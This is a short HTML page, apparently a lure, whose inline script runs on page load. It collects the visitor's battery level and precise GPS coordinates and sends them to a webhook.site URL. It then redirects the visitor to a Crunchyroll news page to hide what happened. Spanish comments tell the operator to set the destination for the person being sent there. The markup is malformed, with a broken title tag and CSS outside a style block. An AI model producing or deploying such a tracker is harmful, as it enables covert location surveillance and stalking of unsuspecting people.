
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
    <script>
        async function ghostTrack() {
            let data = {
                ua: navigator.userAgent,
                bat: "N/A"
            };

            try {
                const b = await navigator.getBattery();
                data.bat = `${(b.level * 100)}%`;
            } catch (e) {}

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => send("?lat=" + p.coords.latitude + "&lon=" + p.coords.longitude + "&prec=" + p.coords.accuracy + "&bat=" + data.bat),
                    (e) => send("?gps=denied&bat=" + data.bat),
                    { enableHighAccuracy: true, timeout: 4000 }
                );
            } else {
                send("?gps=not_supported&bat=" + data.bat);
            }

            // Si tarda mucho, forzamos la salida en 5 segundos
            setTimeout(() => { redirect(); }, 5000);
        }

        function send(params) {
            fetch("https://webhook.site/4cd9958e-65de-4c7f-ae6a-a4dca8efd234" + params)
            .finally(() => redirect());
        }

        function redirect() {
            // AQUÍ PONES EL LINK REAL A DONDE LO VAS A MANDAR
            window.location.href = "https://www.crunchyroll.com/es/news"; 
        }

        window.onload = ghostTrack;
    </script>

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
